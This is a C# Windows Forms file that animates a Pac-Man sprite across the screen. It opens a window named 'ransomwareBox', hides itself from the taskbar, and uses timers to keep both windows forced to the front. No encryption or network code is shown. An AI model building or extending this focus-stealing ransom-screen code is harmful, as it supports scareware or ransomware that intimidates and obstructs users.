using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Timers;
using System.Windows;

namespace PACMAN
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private static System.Timers.Timer aTimer;
        private static System.Timers.Timer bTimer;
        private static System.Timers.Timer cTimer;

        private bool mouth_open = false;

        private double max_x;
        private double max_y;

        private int last_y;

        private String direction = "right";

        private int move_speed = 3;

        private double pacman_width = 102;
        Form2 ransomwareBox = new Form2();

        private void Form1_Load(object sender, EventArgs e)
        {
            
            ransomwareBox.Show();

            this.ShowInTaskbar = false;
            this.Size = new Size((int) pacman_width, (int) pacman_width);

            // Create a timer and set a two second interval.
            aTimer = new System.Timers.Timer();
            aTimer.Interval = 150;

            bTimer = new System.Timers.Timer();
            bTimer.Interval = 1;

            cTimer = new System.Timers.Timer();
            cTimer.Interval = 2000;

            // Hook up the Elapsed event for the timer. 
            aTimer.Elapsed += MoveMouth;
            bTimer.Elapsed += MovePacman;
            cTimer.Elapsed += ForceRansomwareBoxToTop;

            // Have the timer fire repeated events (true is the default)
            aTimer.AutoReset = true;
            bTimer.AutoReset = true;
            cTimer.AutoReset = true;

            max_x = System.Windows.SystemParameters.FullPrimaryScreenWidth;
            max_y = System.Windows.SystemParameters.FullPrimaryScreenHeight;

            // Start the timer
            aTimer.Enabled = true;
            bTimer.Enabled = true;
            cTimer.Enabled = true;

          //  ransomwareBox.Show();
        }

        private void MoveMouth(Object source, System.Timers.ElapsedEventArgs e)
        {
           UpdatePacmanImage();
           mouth_open = !mouth_open;
        }

        private void UpdatePacmanImage()
        {
            Bitmap tmp;

            if (mouth_open)
                tmp = Properties.Resources.mouth_closed;
            else
                tmp = Properties.Resources.mouth_opened;

            // default image points to right
            if (direction == "left")
                tmp.RotateFlip(RotateFlipType.RotateNoneFlipX);
            else if (direction == "down")
                tmp.RotateFlip(RotateFlipType.Rotate90FlipNone);

            this.BackgroundImage = tmp;

        }

        private void ForceRansomwareBoxToTop(Object source, System.Timers.ElapsedEventArgs e)
        { 
            // Force ransomeware box to top (done less often)
            Invoke(new Action(() => { ransomwareBox.Focus(); }));
        }

        private void MovePacman(Object source, System.Timers.ElapsedEventArgs e)
        {
            if(direction == "right")
            {
                if ((this.Location.X + move_speed + pacman_width) > (int) max_x)
                {
                    direction = "down";
                    UpdatePacmanImage();
                    last_y = this.Location.Y;
                    return;
                }
                Invoke(new Action(() => { this.Location = new Point(this.Location.X + move_speed, this.Location.Y); /*this.Activate(); */}));
            }
            else if(direction == "down")
            {
                Console.Out.WriteLine(last_y);

                if ((this.Location.Y + move_speed) > last_y + (pacman_width * 1.5))
                {
                    if (this.Location.X > max_x / 2)
                        direction = "left";
                    else
                        direction = "right";
                    UpdatePacmanImage();
                    return;
                }

                if((this.Location.Y + move_speed) > (int) max_y)
                { 
                    Invoke(new Action(() => { this.Location = new Point(0, 0); this.Activate(); }));
                    last_y = 0;
                }
                else
                    Invoke(new Action(() => { this.Location = new Point(this.Location.X, this.Location.Y + move_speed); /*this.Activate();*/ }));
            }
            else if(direction == "left")
            {
                if ((this.Location.X - move_speed) <= 0)
                {
                    direction = "down";
                    UpdatePacmanImage();
                    last_y = this.Location.Y;
                    return;
                }
                Invoke(new Action(() => { this.Location = new Point(this.Location.X - move_speed, this.Location.Y);/* this.Activate();*/ }));
            }

            // Force to top
            Invoke(new Action(() => { this.Activate(); }));
            

        }
    }
}
